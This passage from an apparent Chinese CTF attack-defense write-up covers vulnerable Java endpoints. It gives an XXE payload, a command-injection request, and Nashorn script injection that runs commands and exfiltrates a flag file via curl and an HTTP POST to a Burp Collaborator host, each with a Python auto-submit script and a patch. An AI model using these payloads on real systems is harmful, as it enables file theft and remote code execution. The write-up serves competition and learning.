class_">InputSource</span>(sr);</span><br><span class="line">           <span class="type">Document</span> <span class="variable">document</span> <span class="operator">=</span> db.parse(is);</span><br><span class="line"></span><br><span class="line">           <span class="type">NodeList</span> <span class="variable">rootNodeList</span> <span class="operator">=</span> document.getChildNodes();</span><br><span class="line">           response(rootNodeList);</span><br><span class="line">           sr.close();</span><br><span class="line">           <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> nodeListToString(rootNodeList);</span><br><span class="line">           <span class="keyword">return</span> result;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           logger.error(e.toString());</span><br><span class="line">           <span class="keyword">return</span> <span class="string">&quot;Error&quot;</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>&#x2F;util&#x2F;doc XXE</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /util/doc</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">node</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">goodies</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">node</span>&gt;</span><span class="symbol">&amp;goodies;</span><span class="tag">&lt;/<span class="name">node</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit_flag</span>(<span class="params">flag</span>):</span><br><span class="line">    url = <span class="string">f&#x27;http://xxx/api/flag&#x27;</span></span><br><span class="line">    proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;https&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;flag&quot;</span>: flag</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=url, headers=&#123;<span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;xxx&quot;</span>&#125;, proxies=proxies)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>(<span class="params">url</span>):</span><br><span class="line">    url = url + <span class="string">&#x27;util/doc&#x27;</span></span><br><span class="line">    <span class="comment"># python3字符串换行，在右边加个反斜杠\，双引号转义可以用&#x27;&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = <span class="string">&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;utf-8\&quot;?&gt;&quot;</span> \</span><br><span class="line">           <span class="string">&quot;&lt;!DOCTYPE node [&quot;</span> \</span><br><span class="line">           <span class="string">&quot;&lt;!ENTITY goodies SYSTEM \&quot;file:///flag\&quot;&gt; ]&gt;&quot;</span> \</span><br><span class="line">           <span class="string">&quot;&lt;node&gt;&amp;goodies;&lt;/node&gt;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;https&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">        response = requests.post(url=url, headers=headers, data=data, proxies=proxies)</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == requests.codes.ok:</span><br><span class="line">            <span class="keyword">if</span> re.search(<span class="string">r&#x27;flag&#123;.*&#125;&#x27;</span>, response.text):</span><br><span class="line">                flag = re.search(<span class="string">r&#x27;flag&#123;.*&#125;&#x27;</span>, response.text)[<span class="number">0</span>]</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] &quot;</span> + url + <span class="string">&quot; connect shell success, flag is &quot;</span> + flag)</span><br><span class="line">                submit_flag(flag)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] Cannot get flag&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Shell 404&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] &quot;</span> + url + <span class="string">&quot; connect shell failed&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    get_flag(<span class="string">&#x27;http://127.0.0.1:10180/&#x27;</span>)</span><br><span class="line">    <span class="comment"># count = 1</span></span><br><span class="line">    <span class="comment"># while 1:</span></span><br><span class="line">        <span class="comment"># print(f&quot;==========第&#123;count&#125;轮提交=========&quot;)</span></span><br><span class="line">        <span class="comment"># count = 10180</span></span><br><span class="line">        <span class="comment"># for i in range(1, 81):</span></span><br><span class="line">            <span class="comment"># url 为靶机ip</span></span><br><span class="line">            <span class="comment"># uri = f&#x27;http://192.168.70.12:&#123;count&#125;/&#x27;</span></span><br><span class="line">            <span class="comment"># print(f&quot;==========第&#123;i&#125;号靶机===========&quot;)</span></span><br><span class="line">            <span class="comment"># get_flag1(uri)</span></span><br><span class="line">            <span class="comment"># count += 100</span></span><br><span class="line">        <span class="comment"># time.sleep(300) </span></span><br></pre></td></tr></table></figure><h3 id="patch-2"><a href="#patch-2" class="headerlink" title="patch"></a>patch</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">@RequestMapping(</span></span><br><span class="line"><span class="meta">value = &#123;&quot;/doc&quot;&#125;,</span></span><br><span class="line"><span class="meta">method = &#123;RequestMethod.POST&#125;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">DocParseX</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;Error&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><h3 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a>源码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/listBucket&quot;)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">listDir</span><span class="params">(String filepath, Model model)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">       String line;</span><br><span class="line">       java.lang.<span class="type">Process</span> <span class="variable">proc</span> <span class="operator">=</span> java.lang.Runtime.getRuntime().exec(<span class="string">&quot;ls -t /tmp/&quot;</span>);</span><br><span class="line">       java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> proc.getInputStream();</span><br><span class="line">       java.io.<span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(in, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">       String[] cmdList = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;ls &quot;</span> + filepath&#125;;</span><br><span class="line">       <span class="type">ProcessBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmdList);</span><br><span class="line">       builder.redirectErrorStream(<span class="literal">true</span>);</span><br><span class="line">       <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> builder.start();</span><br><span class="line">       <span class="keyword">if</span> (filepath!=<span class="literal">null</span>) &#123;</span><br><span class="line">           List&lt;File&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;File&gt;();</span><br><span class="line">           <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> WebUtils.convertStreamToString(process.getInputStream());</span><br><span class="line"></span><br><span class="line">           String[] files = result.split(System.lineSeparator());</span><br><span class="line">           <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; files.length; i++) &#123;</span><br><span class="line">               <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(i, files[i]);</span><br><span class="line">               list.add(file);</span><br><span class="line">           &#125;</span><br><span class="line">           model.addAttribute(<span class="string">&quot;list&quot;</span>, list);</span><br><span class="line">           <span class="keyword">return</span> <span class="string">&quot;bucket&quot;</span>;</span><br><span class="line">       &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">           List&lt;File&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;File&gt;();</span><br><span class="line">           <span class="type">int</span> <span class="variable">id</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">           <span class="keyword">while</span>( (line = br.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">               <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(id, line);</span><br><span class="line">               list.add(file);</span><br><span class="line">               id ++;</span><br><span class="line">           &#125;</span><br><span class="line">           model.addAttribute(<span class="string">&quot;list&quot;</span>, list);</span><br><span class="line">           <span class="keyword">return</span> <span class="string">&quot;bucket&quot;</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>&#x2F;listBucket 命令注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /listBucket?filepath=;cat%<span class="number">20</span>/flag</span><br></pre></td></tr></table></figure><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">count1 = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit_flag</span>(<span class="params">flag</span>):</span><br><span class="line">    url = <span class="string">f&#x27;http://xxx/api/flag&#x27;</span></span><br><span class="line">    proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;https&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;flag&quot;</span>: flag</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=url, headers=&#123;<span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;xxx&quot;</span>&#125;, proxies=proxies)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = url + <span class="string">&quot;listBucket?filepath=;cat%20/flag&quot;</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        data = &#123;&#125;</span><br><span class="line">        proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;https&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">        response = requests.get(url=url, headers=headers, data=data, proxies=proxies)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        <span class="keyword">if</span> response.status_code == requests.codes.ok:</span><br><span class="line">            <span class="keyword">if</span> re.search(<span class="string">r&#x27;flag&#123;.*&#125;&#x27;</span>, response.text):</span><br><span class="line">                flag = re.search(<span class="string">r&#x27;flag&#123;.*&#125;&#x27;</span>, response.text)[<span class="number">0</span>]</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] &quot;</span> + url + <span class="string">&quot; connect shell success, flag is &quot;</span> + flag)</span><br><span class="line">                submit_flag(flag)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] Cannot get flag&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Shell 404&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] &quot;</span> + url + <span class="string">&quot; connect shell failed&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    get_flag(<span class="string">&quot;http://127.0.0.1:10180/&quot;</span>)</span><br><span class="line">    <span class="comment"># count = 1</span></span><br><span class="line">    <span class="comment"># while 1:</span></span><br><span class="line">    <span class="comment">#     print(f&quot;==========第&#123;count&#125;轮提交=========&quot;)</span></span><br><span class="line">    <span class="comment">#     count = 10180</span></span><br><span class="line">    <span class="comment">#     # count = 14680</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment">#     for i in range(1, 59):</span></span><br><span class="line">    <span class="comment">#         # url 为靶机ip</span></span><br><span class="line">    <span class="comment">#         uri = f&#x27;http://192.168.70.12:&#123;count&#125;/&#x27;</span></span><br><span class="line">    <span class="comment">#         print(f&quot;==========第&#123;i&#125;号靶机===========&quot;)</span></span><br><span class="line">    <span class="comment">#         get_flag1(uri)</span></span><br><span class="line">    <span class="comment">#         count += 100</span></span><br><span class="line">    <span class="comment">#     print(&quot;[+]Get flag count &#123;&#125;&quot;.format(count1))</span></span><br><span class="line">    <span class="comment">#     count1 = 0</span></span><br><span class="line">    <span class="comment">#     time.sleep(300) </span></span><br></pre></td></tr></table></figure><h3 id="patch-3"><a href="#patch-3" class="headerlink" title="patch"></a>patch</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&#123;&quot;/listBucket&quot;&#125;)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">listDir</span><span class="params">(String filepath, Model model)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">       <span class="type">Process</span> <span class="variable">proc</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;ls -t /tmp/&quot;</span>);</span><br><span class="line">       <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> proc.getInputStream();</span><br><span class="line">       <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">       List&lt;File&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line"></span><br><span class="line">       String line;</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">id</span> <span class="operator">=</span> <span class="number">1</span>; (line = br.readLine()) != <span class="literal">null</span>; ++id) &#123;</span><br><span class="line">           <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(id, line);</span><br><span class="line">           list.add(file);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       model.addAttribute(<span class="string">&quot;list&quot;</span>, list);</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;bucket&quot;</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><h3 id="源码-4"><a href="#源码-4" class="headerlink" title="源码"></a>源码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// check jsEngine status</span></span><br><span class="line">   <span class="meta">@GetMapping(&quot;/jsEngine&quot;)</span></span><br><span class="line">   <span class="keyword">public</span> Map&lt;String, String&gt; <span class="title function_">jsEngine</span><span class="params">(String jsurl)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="type">ScriptEngine</span> <span class="variable">engine</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>().getEngineByName(<span class="string">&quot;js&quot;</span>);</span><br><span class="line">       <span class="type">Bindings</span> <span class="variable">bindings</span> <span class="operator">=</span> engine.getBindings(ScriptContext.ENGINE_SCOPE);</span><br><span class="line">       <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> String.format(<span class="string">&quot;load(\&quot;%s\&quot;)&quot;</span>, jsurl);</span><br><span class="line">       <span class="keyword">try</span>&#123;</span><br><span class="line">           Map&lt;String, String&gt; jsStatus = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">           jsStatus.put(<span class="string">&quot;status&quot;</span>, <span class="string">&quot;jsEngine is loading...&quot;</span>);</span><br><span class="line">           engine.eval(cmd, bindings);</span><br><span class="line">           <span class="keyword">return</span> jsStatus;</span><br><span class="line">       &#125; <span class="keyword">catch</span>(ScriptException e)&#123;</span><br><span class="line">           Map&lt;String, String&gt; jsStatus = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">           jsStatus.put(<span class="string">&quot;status&quot;</span>, <span class="string">&quot;jsEngine is ready&quot;</span>);</span><br><span class="line">           <span class="keyword">return</span> jsStatus;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>&#x2F;util&#x2F;jsEngine js代码注入</p><p>命令执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /util/jsEngine?jsurl=nashorn:mozilla_compat.js%<span class="number">22</span>);%<span class="number">20</span>importPackage(java.lang);%<span class="number">20</span><span class="keyword">var</span>%<span class="number">20</span>x=Runtime.<span class="title function_ invoke__">getRuntime</span>();%<span class="number">20</span>x.<span class="title function_ invoke__">exec</span>(%<span class="number">22</span>calc</span><br></pre></td></tr></table></figure><p>但是没有回显，尝试外带,用java自有库读文件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jsurl</span> <span class="operator">=</span> <span class="string">&quot;nashorn:mozilla_compat.js\&quot;); &quot;</span> +</span><br><span class="line"><span class="string">&quot;importPackage(java.lang); &quot;</span> +</span><br><span class="line"><span class="string">&quot;var x = Runtime.getRuntime(); &quot;</span> +</span><br><span class="line"><span class="string">&quot;importPackage(java.io.FileReader); &quot;</span> +</span><br><span class="line"><span class="string">&quot;importPackage(java.io.BufferedReader); &quot;</span> +</span><br><span class="line"><span class="string">&quot;var file = new java.io.File(&#x27;/flag&#x27;);&quot;</span> + <span class="comment">// 利用java.io.File(&#x27;/flag&#x27;)读取文件</span></span><br><span class="line"><span class="string">&quot;var fileReader = new java.io.FileReader(file);&quot;</span> +</span><br><span class="line"><span class="string">&quot;var bufferedReader = new java.io.BufferedReader(fileReader);&quot;</span> +</span><br><span class="line"><span class="string">&quot;var flag = bufferedReader.readLine();&quot;</span> +</span><br><span class="line"><span class="string">&quot;var cmd = \&quot;curl -X GET http://bxcl2ozhapx8lllzmp142n6ljcp2dr.burpcollaborator.net/?\&quot;;&quot;</span> +</span><br><span class="line"><span class="string">&quot;x.exec(cmd%2Bflag);&quot;</span> +</span><br><span class="line"><span class="string">&quot;(\&quot;&quot;</span>;</span><br></pre></td></tr></table></figure><p>只能做到命令执行，无法执行完整的curl提交到api接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;curl -X POST http://bxcl2ozhapx8lllzmp142n6ljcp2dr.burpcollaborator.net/ -H &#x27;Authorization: xxx&#x27; -d &#x27;&#123;\&quot;flag\&quot;: \&quot;1111\&quot;&#125;&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure><p>使用jdk自带的库实现post请求</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jsurl</span> <span class="operator">=</span> <span class="string">&quot;nashorn:mozilla_compat.js\&quot;); &quot;</span> +</span><br><span class="line">               <span class="string">&quot;importPackage(java.lang); &quot;</span> +</span><br><span class="line">               <span class="string">&quot;var x = Runtime.getRuntime(); &quot;</span> +</span><br><span class="line">               <span class="string">&quot;importPackage(java.io.FileReader); &quot;</span> +</span><br><span class="line">               <span class="string">&quot;importPackage(java.io.BufferedReader); &quot;</span> +</span><br><span class="line">               <span class="string">&quot;var file = new java.io.File(&#x27;/flag&#x27;);&quot;</span> +</span><br><span class="line">               <span class="string">&quot;var fileReader = new java.io.FileReader(file);&quot;</span> +</span><br><span class="line">               <span class="string">&quot;var bufferedReader = new java.io.BufferedReader(fileReader);&quot;</span> +</span><br><span class="line">               <span class="string">&quot;var flag = bufferedReader.readLine();&quot;</span> +</span><br><span class="line">               <span class="string">&quot;importPackage(java.net); &quot;</span> +</span><br><span class="line">               <span class="string">&quot;var url = \&quot;http://bxcl2ozhapx8lllzmp142n6ljcp2dr.burpcollaborator.net/\&quot;;&quot;</span> +</span><br><span class="line">               <span class="string">&quot;var obj = new URL(url);&quot;</span> +</span><br><span class="line">               <span class="string">&quot;var con = obj.openConnection();&quot;</span> +</span><br><span class="line">               <span class="string">&quot;con.setRequestMethod(\&quot;POST\&quot;);&quot;</span> +</span><br><span class="line">               <span class="string">&quot;con.setRequestProperty(\&quot;Content-Type\&quot;, \&quot;application/json\&quot;);&quot;</span> +</span><br><span class="line">               <span class="string">&quot;con.setRequestProperty(\&quot;Authorization\&quot;, \&quot;xxx\&quot;);&quot;</span> +</span><br><span class="line">               <span class="string">&quot;var data = \&quot;&#123;\\\&quot;flag\\\&quot;:\\\&quot;\&quot; + flag + \&quot;\\\&quot;&#125;\&quot;;&quot;</span> +</span><br><span class="line">               <span class="string">&quot;con.setDoOutput(true);&quot;</span> +</span><br><span class="line">               <span class="string">&quot;var wr = new java.io.DataOutputStream(con.getOutputStream());&quot;</span> +</span><br><span class="line">               <span class="string">&quot;wr.writeBytes(data);&quot;</span> +</span><br><span class="line">               <span class="string">&quot;wr.flush();&quot;</span> +</span><br><span class="line">               <span class="string">&quot;wr.close();&quot;</span> +</span><br><span class="line">               <span class="string">&quot;con.getResponseCode();&quot;</span> +</span><br><span class="line">               <span class="string">&quot;(\&quot;&quot;</span>;</span><br><span class="line">       System.out.println(jsurl);</span><br><span class="line">       <span class="type">ScriptEngine</span> <span class="variable">engine</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>().getEngineByName(<span class="string">&quot;js&quot;</span>);</span><br><span class="line">       <span class="type">Bindings</span> <span class="variable">bindings</span> <span class="operator">=</span>engine.getBindings(ScriptContext.ENGINE_SCOPE);</span><br><span class="line">       <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> String.format(<span class="string">&quot;load(\&quot;%s\&quot;)&quot;</span>, jsurl);</span><br><span class="line">       System.out.println(engine.eval(cmd, bindings));</span><br></pre></td></tr></table></figure><p>请求</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET 